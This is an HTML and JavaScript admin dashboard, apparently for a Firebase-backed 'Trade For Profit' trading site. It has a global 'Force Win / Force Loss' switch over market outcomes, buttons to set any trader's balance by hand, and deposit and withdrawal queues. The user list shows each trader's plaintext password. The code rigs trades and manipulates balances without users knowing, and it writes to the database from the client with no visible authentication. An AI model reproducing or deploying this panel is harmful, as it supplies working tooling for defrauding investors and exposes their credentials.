<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TFP | Admin Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; padding: 15px; }
        .card { background: #181a20; border: 1px solid #2b2f36; border-radius: 12px; padding: 12px; margin-bottom: 10px; }
        input { background: #0b0e11 !important; border: 1px solid #2b2f36 !important; color: white !important; font-size: 12px; padding: 5px; width: 60px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1 class="text-lg font-black text-yellow-500 mb-6 uppercase italic border-b border-gray-800 pb-2">Master Admin</h1>

    <div class="card border-2 border-yellow-500 mb-8">
        <h2 class="text-[10px] font-bold text-yellow-500 mb-3 uppercase tracking-tighter">Global Market Mode</h2>
        <div class="grid grid-cols-3 gap-2">
            <button onclick="setMode('win')" class="bg-green-600 p-2 text-[10px] font-black rounded uppercase">Force Win</button>
            <button onclick="setMode('random')" class="bg-gray-600 p-2 text-[10px] font-black rounded uppercase">Random</button>
            <button onclick="setMode('loss')" class="bg-red-600 p-2 text-[10px] font-black rounded uppercase">Force Loss</button>
        </div>
        <p class="text-[9px] text-gray-500 mt-2 text-center">Current Mode: <b id="curMode" class="text-white">...</b></p>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div>
            <h2 class="text-[10px] font-bold text-gray-500 mb-3 uppercase">Traders Management</h2>
            <div id="uList"></div>
        </div>
        <div>
            <h2 class="text-[10px] font-bold text-green-500 mb-3 uppercase">Pending Actions</h2>
            <div id="reqList"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
        const db = getDatabase(initializeApp({ databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com/" }));

        // Load Users
        onValue(ref(db, 'users'), (s) => {
            const data = s.val(); const cont = document.getElementById('uList'); cont.innerHTML = '';
            for(let id in data){
                const u = data[id];
                let rC = 0; for(let k in data) if(data[k].refBy === u.myRef) rC++;
                cont.innerHTML += `<div class="card">
                    <div class="flex justify-between">
                        <p class="text-sm font-bold">${u.name || 'User'}</p>
                        <p class="text-green-500 font-bold">$${u.balance.toFixed(2)}</p>
                    </div>
                    <p class="text-[9px] text-gray-500 mt-1">${id.replace(/_/g,'.')} | Pass: ${u.password}</p>
                    <div class="mt-3 flex gap-2 pt-2 border-t border-gray-800">
                        <input type="number" id="in_${id}" placeholder="$">
                        <button onclick="setB('${id}')" class="bg-green-600 text-[10px] px-2 py-1 rounded">SET</button>
                        ${rC >= 10 ? `<button onclick="giveB('${id}')" class="bg-yellow-500 text-black text-[10px] px-2 py-1 rounded font-bold italic">+$5 BONUS</button>` : ''}
                    </div>
                </div>`;
            }
        });

        // Load Mode
        onValue(ref(db, 'admin/mode'), (s) => document.getElementById('curMode').innerText = s.val()?.toUpperCase() || 'RANDOM');

        // Load Requests
        onValue(ref(db, 'admin'), (s) => {
            const data = s.val(); const cont = document.getElementById('reqList'); cont.innerHTML = '';
            if(data?.deposits) for(let k in data.deposits) cont.innerHTML += `<div class="card border-l-4 border-green-500 text-[10px]"><p>DEP: ${data.deposits[k].user}</p><p>TxID: ${data.deposits[k].txid}</p><button onclick="del('deposits','${k}')" class="text-green-500 font-bold mt-2 underline">APPROVE</button></div>`;
            if(data?.withdrawals) for(let k in data.withdrawals) cont.innerHTML += `<div class="card border-l-4 border-red-500 text-[10px]"><p>WITH: ${data.withdrawals[k].user}</p><p>$${data.withdrawals[k].amt} (${data.withdrawals[k].method})</p><button onclick="del('withdrawals','${k}')" class="text-red-500 font-bold mt-2 underline">MARK PAID</button></div>`;
        });

        window.setMode = (m) => update(ref(db, 'admin'), { mode: m });
        window.setB = (id) => update(ref(db, 'users/'+id), { balance: parseFloat(document.getElementById('in_'+id).value) });
        window.giveB = (id) => get(ref(db, 'users/'+id)).then(s=>update(ref(db, 'users/'+id), { balance: s.val().balance + 5 }));
        window.del = (p,k) => remove(ref(db, `admin/${p}/${k}`));
    </script>
</body>
<
    /html>
